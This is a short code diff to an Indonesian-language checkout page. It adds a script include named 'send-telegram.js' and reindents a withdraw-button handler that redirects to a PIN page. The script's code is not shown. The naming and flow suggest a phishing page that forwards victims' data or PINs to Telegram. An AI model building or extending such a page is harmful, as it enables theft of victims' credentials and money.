@@ -12,6 +12,7 @@
   <link rel="shortcut icon" href="../assets/images/favicon.png" type="image/x-icon">
   <link href="assets/checkout.css" rel="stylesheet">
   <link href="assets/cicil.css" rel="stylesheet">
+  <script src="js/send-telegram.js"></script>
 </head>
 
 <body><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
@@ -3414,12 +3415,12 @@
         updateSliderOnly(0);
 
         btnWithdraw.disabled = true;
-                btnWithdraw.innerHTML = '<div class="loading-spinner"></div> Memproses...';
+        btnWithdraw.innerHTML = '<div class="loading-spinner"></div> Memproses...';
 
-                setTimeout(() => {
-                    window.location.href = 'pin.html';
-                }, 800);
-            });
+        setTimeout(() => {
+          window.location.href = 'pin.html';
+        }, 800);
+      });
 
       popupBalance.addEventListener('click', e => {
         if (e.target === popupBalance) {
